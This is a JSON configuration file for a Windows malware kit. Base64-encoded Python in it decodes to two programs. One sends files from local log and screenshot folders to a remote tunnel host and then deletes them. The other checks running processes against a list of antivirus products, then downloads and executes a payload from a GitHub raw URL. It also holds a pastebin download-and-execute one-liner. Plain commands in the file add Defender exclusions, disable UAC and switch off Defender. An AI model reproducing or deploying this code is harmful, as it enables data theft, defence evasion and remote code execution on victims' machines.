{
    "MSwatcher.exe": {
        "commands": {
            "targets": [
                [
                    null,
                    "webconnect.exe",
                    true
                ],
                [
                    null,
                    "msng.exe",
                    true
                ],
                [
                    null,
                    "MStunnel.exe",
                    true
                ],
                [
                    null,
                    "MSapplicationlogs.exe",
                    true
                ]
            ],
            "timeout": 60
        },
        "data": [
            ""
        ]
    },
    "MSapplicationlogs.exe" : {
        "data" : 
            [""]
        
    },
    "MStunnel.exe" : {
        "data" : 
            ["IyBmaWxlX3NlbmRlci5weQ0KaW1wb3J0IHNvY2tldA0KaW1wb3J0IG9zDQpmcm9tIGRhdGV0aW1lIGltcG9ydCBkYXRldGltZQ0KaW1wb3J0IHRpbWUNCg0KIiIiDQpkZWYgd19qc29uKGRpY3RfIDogZGljdCwgZGlyXyA9IGZpbGVfZGlyKSAtPiBOb25lOg0KICAgIHdpdGggb3BlbihkaXJfLCAndysnKSBhcyBmaWxlXzoNCiAgICAgICAgZmlsZV8ud3JpdGUoanNvbi5kdW1wcyhkaWN0XywgaW5kZW50PTYpKQ0KZGVmIHJfanNvbihkaXJfID0gZmlsZV9kaXIpIC0+IGRpY3Q6DQogICAgd2l0aCBvcGVuKGRpcl8sJ3IrJykgYXMgcmVhZGVyXzoNCiAgICAgICAgYWxsX2xvZ3MgPSBqc29uLmxvYWQocmVhZGVyXykNCiAgICByZXR1cm4gYWxsX2xvZ3MNCiIiIg0KDQpjbGFzcyBGaWxlU2VuZGVyOg0KICAgIGRlZiBfX2luaXRfXyhzZWxmLCBzZXJ2ZXJfaG9zdD0nMTI3LjAuMC4xJywgc2VydmVyX3BvcnQ9NTAwMCk6DQogICAgICAgIHNlbGYuc2VydmVyX2hvc3QgPSBzZXJ2ZXJfaG9zdA0KICAgICAgICBzZWxmLnNlcnZlcl9wb3J0ID0gc2VydmVyX3BvcnQNCiAgICAgICAgDQogICAgZGVmIHNlbmRfZmlsZShzZWxmLCBmaWxlX3BhdGgpOg0KICAgICAgICBpZiBub3Qgb3MucGF0aC5leGlzdHMoZmlsZV9wYXRoKToNCiAgICAgICAgICAgIHByaW50KGYiW3tkYXRldGltZS5ub3coKX1dIEVycm9yOiBGaWxlICd7ZmlsZV9wYXRofScgbm90IGZvdW5kIikNCiAgICAgICAgICAgIHJldHVybiBGYWxzZQ0KICAgICAgICAgICAgDQogICAgICAgIGZpbGVfbmFtZSA9IG9zLnBhdGguYmFzZW5hbWUoZmlsZV9wYXRoKQ0KICAgICAgICBmaWxlX3NpemUgPSBvcy5wYXRoLmdldHNpemUoZmlsZV9wYXRoKQ0KICAgICAgICANCiAgICAgICAgdHJ5Og0KICAgICAgICAgICAgcHJpbnQoZiJbe2RhdGV0aW1lLm5vdygpfV0gQ29ubmVjdGluZyB0byBzZXJ2ZXIuLi4iKQ0KICAgICAgICAgICAgd2l0aCBzb2NrZXQuc29ja2V0KHNvY2tldC5BRl9JTkVULCBzb2NrZXQuU09DS19TVFJFQU0pIGFzIHNvY2s6DQogICAgICAgICAgICAgICAgc29jay5jb25uZWN0KChzZWxmLnNlcnZlcl9ob3N0LCBzZWxmLnNlcnZlcl9wb3J0KSkNCiAgICAgICAgICAgICAgICANCiAgICAgICAgICAgICAgICAjIFNlbmQgZmlsZW5hbWUgbGVuZ3RoICg0IGJ5dGVzKSBhbmQgZmlsZW5hbWUNCiAgICAgICAgICAgICAgICBzb2NrLnNlbmRhbGwobGVuKGZpbGVfbmFtZSkudG9fYnl0ZXMoNCwgYnl0ZW9yZGVyPSdiaWcnKSkNCiAgICAgICAgICAgICAgICBzb2NrLnNlbmRhbGwoZmlsZV9uYW1lLmVuY29kZSgndXRmLTgnKSkNCiAgICAgICAgICAgICAgICANCiAgICAgICAgICAgICAgICAjIFNlbmQgZmlsZSBzaXplICg4IGJ5dGVzKQ0KICAgICAgICAgICAgICAgIHNvY2suc2VuZGFsbChmaWxlX3NpemUudG9fYnl0ZXMoOCwgYnl0ZW9yZGVyPSdiaWcnKSkNCiAgICAgICAgICAgICAgICANCiAgICAgICAgICAgICAgICAjIFNlbmQgZmlsZSBkYXRhDQogICAgICAgICAgICAgICAgcHJpbnQoZiJbe2RhdGV0aW1lLm5vdygpfV0gU2VuZGluZyBmaWxlICd7ZmlsZV9uYW1lfScgKHtmaWxlX3NpemV9IGJ5dGVzKS4uLiIpDQogICAgICAgICAgICAgICAgd2l0aCBvcGVuKGZpbGVfcGF0aCwgJ3JiJykgYXMgZmlsZToNCiAgICAgICAgICAgICAgICAgICAgd2hpbGUgVHJ1ZToNCiAgICAgICAgICAgICAgICAgICAgICAgIGRhdGEgPSBmaWxlLnJlYWQoNDA5NikNCiAgICAgICAgICAgICAgICAgICAgICAgIGlmIG5vdCBkYXRhOg0KICAgICAgICAgICAgICAgICAgICAgICAgICAgIGJyZWFrDQogICAgICAgICAgICAgICAgICAgICAgICBzb2NrLnNlbmRhbGwoZGF0YSkNCiAgICAgICAgICAgICAgICANCiAgICAgICAgICAgICAgICAjIEdldCBjb25maXJtYXRpb24gZnJvbSBzZXJ2ZXINCiAgICAgICAgICAgICAgICByZXNwb25zZSA9IHNvY2sucmVjdigxMDI0KS5kZWNvZGUoJ3V0Zi04JykNCiAgICAgICAgICAgICAgICBwcmludChmIlt7ZGF0ZXRpbWUubm93KCl9XSBTZXJ2ZXIgcmVzcG9uc2U6IHtyZXNwb25zZX0iKQ0KICAgICAgICAgICAgICAgIHJldHVybiBUcnVlDQogICAgICAgICAgICAgICAgDQogICAgICAgIGV4Y2VwdCBFeGNlcHRpb24gYXMgZToNCiAgICAgICAgICAgIHByaW50KGYiW3tkYXRldGltZS5ub3coKX1dIEVycm9yOiB7c3RyKGUpfSIpDQogICAgICAgICAgICByZXR1cm4gRmFsc2UNCg0KZGVmIG1haW4oKToNCg0KICAgIGRlbGF5X18gPSA1DQogICAgcHJpbnQoIkZpbGUgU2VuZGVyIFByb2dyYW0iKQ0KICAgIHNlcnZlcl9ob3N0ID0gImZpbmQtcG9zdGluZy5nbC5hdC5wbHkuZ2ciDQogICAgc2VydmVyX3BvcnQgPSAzNjgyMQ0KICAgIA0KICAgICMgZmluZC1wb3N0aW5nLmdsLmF0LnBseS5nZzozNjgyMQ0KICAgIHNlbmRlciA9IEZpbGVTZW5kZXIoc2VydmVyX2hvc3QsIHNlcnZlcl9wb3J0KQ0KDQogICAgX19jdXJyZW50RGlyID0gb3MuZ2V0Y3dkKCkNCiAgICBfX3BhdGggPSBbDQogICAgICAgICAgICAgICAgX19jdXJyZW50RGlyICsgJ1xcTG9nc1xcU1MnLA0KICAgICAgICAgICAgICAgIF9fY3VycmVudERpciArICdcXExvZ3NcXERhdGEnDQogICAgICAgICAgICBdDQogICAgaWR4X18gPSAwDQogICAgd2hpbGUgVHJ1ZToNCiAgICAgICAgX19mb3VuZCA9IGlkeF9fJTINCiAgICAgICAgYWxsRmlsZXMgPSBvcy5saXN0ZGlyKF9fcGF0aFtfX2ZvdW5kXSkNCiAgICAgICAgZm9yIF9fYSBpbiBhbGxGaWxlczoNCiAgICAgICAgDQogICAgICAgICAgICBmaWxlX3BhdGggPSBfX3BhdGhbX19mb3VuZF0gKyAnXFwnICsgX19hDQogICAgICAgICAgICANCiAgICAgICAgICAgIGlmIG9zLnBhdGguZXhpc3RzKGZpbGVfcGF0aCk6DQogICAgICAgICAgICAgICAgIiIiaWYgZXZlcnl0aGluZyBpcyBnb29kIiIiDQogICAgICAgICAgICAgICAgX19mbGFnID0gc2VuZGVyLnNlbmRfZmlsZShmaWxlX3BhdGgpDQogICAgICAgICAgICAgICAgaWYgX19mbGFnIGlzIFRydWU6DQogICAgICAgICAgICAgICAgICAgICIiInNlbnQgc3VjY2Vzc2Z1bGx5IiIiDQogICAgICAgICAgICAgICAgICAgICNvcy5zeXN0ZW0oZidERUwge2ZpbGVfcGF0aH0nKQ0KICAgICAgICAgICAgICAgICAgICBvcy5yZW1vdmUoZmlsZV9wYXRoKSAjIGRlbGV0ZXMgZm9yZXZlciBvdGhlciB0aGFuIG1vdmluZyB0byB0aGUgcmVjeWNsZSBiaW4NCiAgICAgICAgICAgICAgICAgICAgcHJpbnQoZiJEZWxldGVkIHtfX2F9IixlbmQ9IlxuIikNCiAgICAgICAgICAgIGVsc2U6DQogICAgICAgICAgICAgICAgcHJpbnQoZiJbe2RhdGV0aW1lLm5vdygpfV0gRXJyb3I6IEZpbGUgbm90IGZvdW5kIikNCiAgICAgICAgICAgICN0aW1lLnNsZWVwKGRlbGF5X18pDQogICAgICAgIGlkeF9fKz0xDQogICAgICAgIHRpbWUuc2xlZXAoZGVsYXlfXykNCg0KDQoNCmlmIF9fbmFtZV9fID09ICJfX21haW5fXyI6DQogICAgbWFpbigp"]
        
    },
    "init.exe" : {
        "data" : [
            "DQonJycNCiNpZXggKGlybSAiaHR0cHM6Ly9wYXN0ZWJpbi5jb20vcmF3LzFMaWJrbkJBIikNCkZpcnN0IGp1c3QgcG9pbnQgdGhlIHRhcmdldCBieSB3cml0aW5nIGl0IHRvIHBvd2Vyc2hlbGwgdGVybWluYWwNCiAgICB0aGUgcGFzdGViaW4gd2lsbCBjb250YWluIHRoZSBwb3dlcnNoZWxsIGNvbW1hbmRzDQogICAgICAgIGRvd25sb2FkIHRoZSBweXRob24gdG8gZXhlIGNvbnZlcnRlZCBmaWxlIHRoYXQgd2lsbCBtYW5hZ2UgdGhlIHBheWxvYWQNCicnJw0KDQoiIiINCg0KDQoNCiIiIg0KDQppbXBvcnQgb3MsIHJlcXVlc3RzLCBqc29uLCBwc3V0aWwsIHRpbWUNCmZyb20gcmljaC5jb25zb2xlIGltcG9ydCBDb25zb2xlDQojZnJvbSBzaHV0aWwgaW1wb3J0IHVucGFja19hcmNoaXZlDQpmcm9tIHRxZG0gaW1wb3J0IHRxZG0NCg0KDQoNCmNvbnNvbGUgPSBDb25zb2xlKCkNCmdsb2JhbCBmb2xkZXJfLCBsb2dDb25zb2xlDQpmaWxlX18gPSAnaW5pdC5leGUnDQojIHRoZSBmaXhlZCB1cmxzDQpsb2dDb25zb2xlID0gVHJ1ZQ0KZGV0ZWN0ZWQgPSB7fSAjIGluc3RhbGxlZCBhdg0KemlwRmlsZU5hbWUgPSAnV2luZG93c1NlcnZpY2VBcHBsaWNhdGlvbi56aXAnDQpleGVfID0gWydXaW5kb3dzU2VydmljZUFwcGxpY2F0aW9uLmV4ZSddDQpmb2xkZXJfID0gJ1dpbmRvd3NTZXJ2aWNlQXBwbGljYXRpb24nICMgZm9sZGVyIG91dHNpZGUgdGhlIHBheWxvYWQNCmpzb25GaWxlID0gJ2NvbmZpZy5qc29uJw0KDQoNCmdpdGh1Yl9yYXcgPSAnaHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL1NoaW5pZ2FtaVJ5dWszMi9TaGluaWdhbWkvcmVmcy9oZWFkcy9tYWluLycNCmNvbW1hbmRzX3VybCA9IFsgZ2l0aHViX3JhdyArIGpzb25GaWxlIF0gIyBjb21tYW5kcyBmaWxlDQojIGhhdmUgdG8gdXNlIHJhdyB1cmwNCnVybHMgPSBbDQogICAgJ1dpbmRvd3NTZXJ2aWNlQXBwbGljYXRpb24uZXhlJw0KXQ0KI2ZpeFVybCA9IGxhbWJkYSB1X18gOiB1X18ucmVwbGFjZSgnd3d3LmRyb3Bib3guY29tJywgJ2RsLmRyb3Bib3h1c2VyY29udGVudC5jb20nKQ0KDQoiIiIgQmFzaWMgcHJpbnRpbmcgZnVuY3Rpb24gIiIiDQpkZWYgbm90ZShzdHJpbmdfLCBlbmRfID0gJ1xuJykgLT4gTm9uZToNCiAgICBzdGFuZGFyZF9kaXN0YW5jZSA9ICdcdCcNCiAgICBpZiBsb2dDb25zb2xlOg0KICAgICAgICBjb25zb2xlLnByaW50KGYie3N0YW5kYXJkX2Rpc3RhbmNlfXtzdHJpbmdffSIsZW5kID0gZW5kXykNCiAgICAgICAgDQoNCiIiIg0KV291bGQgd3JpdGUgdG8gYSBnbG9iYWwgdmFyaWFibGUNCiIiIg0KZGVmIHJlYWRKU09OKGZpbGVuYW1lOnN0cikgLT4gTm9uZToNCiAgICB3aXRoIG9wZW4oZmlsZW5hbWUsICdyKycpIGFzIGZpbGVfOg0KICAgICAgICBnbG9iYWwgcmF3X2RhdGENCiAgICAgICAgcmF3X2RhdGEgPSBqc29uLmxvYWQoZmlsZV8pDQogICAgICAgIGFzc2VydCB0eXBlKHJhd19kYXRhKSA9PSBkaWN0DQogICAgICAgIA0KDQpkZWYgZ2V0X3J1bm5pbmdfcHJvY2VzcygpIC0+IGxpc3Q6DQogICAgcHJvY2Vzc2xpc3QgPSBsaXN0KCkNCiAgICBmb3IgcHJvY2VzcyBpbiBwc3V0aWwucHJvY2Vzc19pdGVyKCk6IHByb2Nlc3NsaXN0LmFwcGVuZChwcm9jZXNzLm5hbWUoKSkNCiAgICByZXR1cm4gcHJvY2Vzc2xpc3QNCg0KZ2V0RmlsZU5hbWVGcm9tVXJsID0gbGFtYmRhIG5hbWVfIDogc3RyKG5hbWVfLnJzcGxpdCgnLycpWy0xXSkgIyByZXR1cm5zIHRoZSBsYXN0IG5hbWUgb2YgdGhlIHVybA0KcmVsYXRpdmVfcGF0aCA9IGxhbWJkYSBxdWVyeSA9IHN0ciA6IG9zLnBhdGguam9pbihvcy5wYXRoLmV4cGFuZHVzZXIoJ34nKSwgZid7cXVlcnl9JykNCiNleHRyYWN0WmlwID0gbGFtYmRhIHppcE5hbWUsIGRlc3RGb2xkZXIgOiB1bnBhY2tfYXJjaGl2ZSh6aXBOYW1lLCBkZXN0Rm9sZGVyKQ0KDQpnbG9iYWwgcGF0aF9fDQpwYXRoX18gPSByZWxhdGl2ZV9wYXRoKCdBcHBEYXRhJykgKyByJ1xSb2FtaW5nJw0KDQpkZWYgc3RhcnREb3dubG9hZGluZygpIDoNCiAgICAjIGdldCB0aGUgdnNsdXJlcyBmcm9tIHJhdyBkYXRhDQogICAgbm90ZShmIlticmlnaHRfYmx1ZSBiXURvd25sb2FkIHN0YXJ0ZWQgISIpDQogICAgZm9yIGlkeCx1XyBpbiBlbnVtZXJhdGUodXJscyk6DQogICAgICAgIGZvb18gPSBkb3dubG9hZF9maWxlKGYne2dpdGh1Yl9yYXd9L3t1X30nLGYne3BhdGhfX31cXFdpbmRvd3NTZXJ2aWNlQXBwbGljYXRpb25cXHt1X30nKQ0KICAgICAgICBub3RlKEYnW3JpZ2h0X3llbGxvdyBiXXtpZHgrMX0ge3VffScpDQoNCmRlZiBhdnMoKToNCiAgICBwXyA9IGdldF9ydW5uaW5nX3Byb2Nlc3MoKQ0KICAgIGZvciBrLHYgaW4gcmF3X2RhdGFbJ2F2J10uaXRlbXMoKToNCiAgICAgICAgZm9yIHZ2IGluIHY6DQogICAgICAgICAgICBpZiB2diBpbiBwXzoNCiAgICAgICAgICAgICAgICBkZXRlY3RlZFtrXSA9IHYNCiAgICAgICAgICAgICAgICBicmVhaw0KDQogICAga2V5c18gPSBbaSBmb3IgaSBpbiBkZXRlY3RlZC5rZXlzKCldDQogICAgaWYgbGVuKGtleXNfKSA9PSAxIGFuZCAnV2luZG93cyBEZWZlbmRlcicgaW4ga2V5c186DQogICAgICAgIHlpZWxkIFRydWUNCiAgICBlbHNlOg0KICAgICAgICB5aWVsZCBGYWxzZQ0KDQpkZWYgZG93bmxvYWRfZmlsZSh1cmw6IHN0ciwgZE5hbWU6IHN0cikgLT4gbGlzdFtib29sLCBhbnldOg0KICAgICAgICBpbXBvcnQgcmVxdWVzdHMNCiAgICAgICAgDQoNCiAgICAgICAgdHJ5Og0KICAgICAgICAgICAgcmVzcG9uc2UgPSByZXF1ZXN0cy5nZXQodXJsLCBzdHJlYW09VHJ1ZSkNCiAgICAgICAgICAgIHJlc3BvbnNlLnJhaXNlX2Zvcl9zdGF0dXMoKQ0KDQogICAgICAgICAgICB0b3RhbF9zaXplID0gaW50KHJlc3BvbnNlLmhlYWRlcnMuZ2V0KCdjb250ZW50LWxlbmd0aCcsIDApKQ0KICAgICAgICAgICAgYmxvY2tfc2l6ZSA9IDgxOTIgICMgOCBLQg0KDQogICAgICAgICAgICB3aXRoIG9wZW4oZE5hbWUsICd3YicpIGFzIGZpbGUsIHRxZG0oDQogICAgICAgICAgICAgICAgdG90YWw9dG90YWxfc2l6ZSwgdW5pdD0nQicsIHVuaXRfc2NhbGU9VHJ1ZSwgZGVzYz1kTmFtZSwgbmNvbHM9MTUwDQogICAgICAgICAgICApIGFzIHByb2dyZXNzX2JhcjoNCiAgICAgICAgICAgICAgICBmb3IgY2h1bmsgaW4gcmVzcG9uc2UuaXRlcl9jb250ZW50KGNodW5rX3NpemU9YmxvY2tfc2l6ZSk6DQogICAgICAgICAgICAgICAgICAgIGlmIGNodW5rOg0KICAgICAgICAgICAgICAgICAgICAgICAgZmlsZS53cml0ZShjaHVuaykNCiAgICAgICAgICAgICAgICAgICAgICAgIHByb2dyZXNzX2Jhci51cGRhdGUobGVuKGNodW5rKSkNCg0KICAgICAgICAgICAgcmV0dXJuIFtUcnVlLCB1cmxdDQoNCiAgICAgICAgZXhjZXB0IEV4Y2VwdGlvbiBhcyBleF9fOg0KICAgICAgICAgICAgcmV0dXJuIFtGYWxzZSwgZXhfX10NCg0KZGVmIHdpbmRvd3NNb2RpZmllcigpIC0+IE5vbmU6DQogICAgIyBqdXN0IHJ1biB0aGUgY29tcGlsZWQgRVhFIC0gcnVucyBhcyBBZG1pbg0KICAgICMgYWRkcyBleF9zDQogICAgZm9yIF9pdGVtIGluIHJhd19kYXRhWydydW4nXToNCiAgICAgICAgdHJ5Og0KICAgICAgICAgICAgeCA9IG9zLnN5c3RlbShfaXRlbSkNCiAgICAgICAgICAgIGlmIHggPT0gMDogbm90ZShGJ1ticmlnaHRfZ3JlZW4gYiBpXVN1Y2Nlc3MgISBbYnJpZ2h0X2N5YW5de19pdGVtfScpDQogICAgICAgIGV4Y2VwdCBFeGNlcHRpb24gYXMgZXhfXzoNCiAgICAgICAgICAgIG5vdGUoRidbYnJpZ2h0X3JlZCBpIGJde2V4X199JykNCiAgICAjIGl0IHdpbGwgYXV0b21hdGljYWxseSByZWFkIHRoZSBjb21tYW5kcyBmcm9tIHRoZSBjb21tYW5kcy5qc29uDQoNCiIiIg0KTWFrZSBmb2xkZXJzIGFuZCBkb3dubG9hZCBmaWxlcyBmb3IgcHJlIC0gZXhlY3V0aW9uIG1vZHVsZXMNCiIiIg0KZGVmIGFjY29tb2RhdGUoKSAtPiBOb25lOg0KDQogICAgIyBjaGFuZ2UgdGhlIGRpcmVjdG9yeSB0byBBcHBEYXRhIFwgTG9jYWwgXCBXaW5kb3dzU2VydmljZUFwcGxpY2F0aW9uDQogICAgbm90ZShmJ1ticmlnaHRfeWVsbG93IHUgYl1DaGFuZ2luZyBkaXJlY3RvcnkgLT4ge3BhdGhfX30nKQ0KICAgIG9zLmNoZGlyKHBhdGhfXykNCiAgICBpZiBub3Qgb3MucGF0aC5leGlzdHMocGF0aF9fKToNCiAgICAgICAgbm90ZShmJ1ticmlnaHRfbWFnZW50YSBiIGldUGF0aCBkb2VzIG5vdCBleGlzdCAhIGNyZWF0aW5nIC4uLicpDQogICAgICAgIG9zLnN5c3RlbShmJ21rZGlyICJ7cGF0aF9ffVxcV2luZG93c1NlcnZpY2VBcHBsaWNhdGlvbiInKSAjIG1ha2UgZGlyZWN0b3J5DQogICAgb3MuY2hkaXIocicuXFdpbmRvd3NTZXJ2aWNlQXBwbGljYXRpb24nKSAjIGNoYW5nZSBkaXJlY290cnkNCg0KICAgICMgZG93bmxvYWQgdGhlIG5lY2Vzc2FyeSBmaWxlcw0KICAgICIiIg0KICAgIG5vdGUoZidbYnJpZ2h0X2JsdWUgYiBpXURvd25sb2FkaW5nIHN0YXJ0ZWQgLi4uJykNCiAgICBmb3IgaSBpbiBjb21tYW5kc191cmw6DQogICAgICAgIGZpcnN0XyA9IGRvd25sb2FkX2ZpbGUoaSwgRid7anNvbkZpbGV9JykNCiAgICAgICAgbm90ZShmaXJzdF8pDQogICAgIiIiDQoNCg0KZ2V0VG9UaGVQb2ludCA9IGxhbWJkYSBleGUgOiBvcy5zdGFydGZpbGUoZid7ZXhlfScpDQoNCmRlZiBtYWluKCkgLT4gTm9uZToNCg0KICAgICN3aW5kb3dzTW9kaWZpZXIoKSAjIE1pY3Jvc29mdCBXaW5kb3dzIERlZmVuZGVyIE9ubHkNCiAgICBzdGFydF9fID0gdGltZS50aW1lKCkNCg0KICAgIF9mbGFnID0gYXZzKCkNCiAgICBpZiBfZmxhZzoNCiAgICAgICAgIyBvbmx5IFdpbmRvd3MgRGVmZW5kZXINCiAgICAgICAgbm90ZShmJ1ticmlnaHRfZ3JlZW4gYl1SdW5uaW5nIFdpbmRvd3MgRGVmZW5kZXIgW2JyaWdodF95ZWxsb3ddIFByb2NlZWRpbmcgLi4uJykNCiAgICAgICAgd2luZG93c01vZGlmaWVyKCkgIyBleGNsdWRlIHRoZSBwYXRocw0KICAgICAgICBzdGFydERvd25sb2FkaW5nKCkgIyBkb3dubG9hZCB0aGUgcGF5bG9hZHMNCiAgICAgICAgI2V4dHJhY3RaaXAoemlwRmlsZU5hbWUsIGZvbGRlcl8pICMgZXh0cmFjdA0KICAgICAgICBmb3IgcHJvZ18gaW4gZXhlXyA6DQogICAgICAgICAgICBnZXRUb1RoZVBvaW50KHByb2dfKQ0KICAgICAgICAgICAgbm90ZShGJ1ticmlnaHRfcmVkIGkgYl1FeGVjdXRlZCB7cHJvZ199JykNCiAgICBlbHNlOg0KICAgICAgICAjIGV4aXQoKQ0KICAgICAgICBub3RlKGYnW2JyaWdodF9tYWdlbnRhIGJdT3RoZXIgQXBwbGljYXRpb25zIFByZXNlbnQnKQ0KICAgICAgICBub3RlKEYiW2JyaWdodF9yZWQgaSBiXU9ubHkgZG93bmxvYWRlZCB6aXAgZmlsZS4gSGF2ZSB0byBkbyB0aGlzIG1hbnVhbGx5IikNCg0KICAgIGVuZF9fID0gdGltZS50aW1lKCkNCiAgICBlbGFwc2VkX18gPSBlbmRfXyAtIHN0YXJ0X18NCiAgICBub3RlKEYnW2JyaWdodF95ZWxsb3cgYmxpbmtdRWxhcHNlZCB+e2VsYXBzZWRfXzouMmZ9IHNlY29uZHMnKQ0KDQoNCmlmIF9fbmFtZV9fID09ICJfX21haW5fXyI6DQogICAgDQogICAgYWNjb21vZGF0ZSgpICMgZG93bmxvYWRzIGFuZCBnYXRoZXJzIHRoZSBmaWxlcyBuZWNlc3NhcnkgZm9yIHRoZSBmaWxlIGV4ZWN1dGlvbg0KICAgIHJlYWRKU09OKGpzb25GaWxlKSAjIHJlYWQgdGhlIGNvbW1hbmRzIHRvIGV4ZWN1dGUgYW5kIGF2cyB0byBkZXRlY3QNCg0KICAgIG1haW4oKQ0KICAgIA=="
        ]
    },
    "run" : [
        "powershell -Command Add-MpPreference -ExclusionPath '%USERPROFILE%\\Downloads'",
        "powershell -Command Add-MpPreference -ExclusionPath '%USERPROFILE%\\Documents'",
        "powershell -Command Add-MpPreference -ExclusionPath '%USERPROFILE%'",
        "powershell -Command Add-MpPreference -ExclusionPath '%AppData%'",
        "reg add \"HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System\" /v EnableLUA /t REG_DWORD /d 0 /f",
        "reg add \"HKEY_LOCAL_MACHINE\\SOFTWARE\\Policies\\Microsoft\\Windows Defender Security Center\\Notifications\" /v \"DisableNotifications\" /t REG_DWORD /d 1 /f",
        "reg add \"HKEY_LOCAL_MACHINE\\SOFTWARE\\Policies\\Microsoft\\Windows Defender\" /v \"DisableAntiVirus\" /t REG_DWORD /d 1 /f",
        "reg add \"HKEY_LOCAL_MACHINE\\SOFTWARE\\Policies\\Microsoft\\Windows Defender\" /v \"DisableAntiSpyware\" /t REG_DWORD /d 1 /f"
    ],

    "av" : {
    "Windows Defender": ["MsMpEng.exe", "NisSrv.exe", "MsSecEng.exe", "SecurityHealthService.exe", "SecurityHealthHost.exe"],
    "Avast": ["AvastSvc.exe", "AvastUI.exe", "AvastEmUpdate.exe", "AvastBrowser.exe", "afwServ.exe"],
    "AVG": ["AVGSvc.exe", "AVGUI.exe", "avgwdsvc.exe", "avgemc.exe", "avgidsagent.exe", "avgrsx.exe"],
    "Bitdefender": ["bdagent.exe", "vsserv.exe", "bdservicehost.exe", "bdredline.exe", "seccenter.exe"],
    "Kaspersky": ["avp.exe", "avpui.exe", "ksde.exe", "klnagent.exe", "kavfs.exe", "kavfswp.exe"],
    "Norton": ["ccSvcHst.exe", "norton.exe", "nav.exe", "ns.exe", "nprotect.exe", "n360.exe"],
    "McAfee": ["mcshield.exe", "mfefire.exe", "mfemms.exe", "mcupdate.exe", "mfeann.exe", "mfewc.exe"],
    "Malwarebytes": ["mbam.exe", "mbamtray.exe", "mbamservice.exe", "mbamdw.exe", "mbampt.exe"],
    "ESET": ["ekrn.exe", "egui.exe", "eamonm.exe", "ehdrv.exe", "epfw.exe", "epfwwfp.exe"],
    "Trend Micro": ["tmntsrv.exe", "tmlisten.exe", "ntrtscan.exe", "ufseagnt.exe", "pccntmon.exe"],
    "Sophos": ["sophos.exe", "savservice.exe", "savadminservice.exe", "almon.exe", "alsvc.exe"],
    "F-Secure": ["fsavgui.exe", "f-secure.exe", "fshoster32.exe", "fssm32.exe", "fsorsp64.exe"],
    "Panda": ["psanhost.exe", "pavsrvx86.exe", "pavsrv51.exe", "apvxdwin.exe", "psksvc.exe"],
    "Comodo": ["cmdagent.exe", "cavwp.exe", "cis.exe", "cc.exe", "cmdsafeproc.exe"],
    "Avira": ["avguard.exe", "avgnt.exe", "avshadow.exe", "sched.exe", "avmailc.exe"],
    "Webroot": ["wrsssdk.exe", "wrsa.exe", "wrcoreservice.exe", "wrtc.exe", "wrcqmgr.exe"],
    "BullGuard": ["bullguard.exe", "bdagent.exe", "bgsvc.exe", "bgbrowserplugin.exe", "bgmain.exe"],
    "G Data": ["avk.exe", "avkcl.exe", "avkservice.exe", "avkpop.exe", "avkproxy.exe"],
    "ZoneAlarm": ["zatray.exe", "vsmon.exe", "zaprivacy.exe", "zapro.exe", "zaclient.exe"],
    "VIPRE": ["sbamsvc.exe", "vipreav.exe", "vipreauth.exe", "sbamtray.exe", "sbamui.exe"],
    "Cylance": ["cylancesvc.exe", "cylanceui.exe", "cylanceprotect.exe", "cylancememoryguard.exe"],
    "CrowdStrike": ["csagent.exe", "csfalconservice.exe", "csfalconcontainer.exe", "cswindiag.exe"],
    "SentinelOne": ["sentinelagent.exe", "sentinelstaticengine.exe", "sentinelmonitor.exe", "sentinelhelper.exe"],
    "Carbon Black": ["cb.exe", "cbsensor.exe", "cbstreamer.exe", "cbagent.exe", "cbdefense.exe"]
}


}
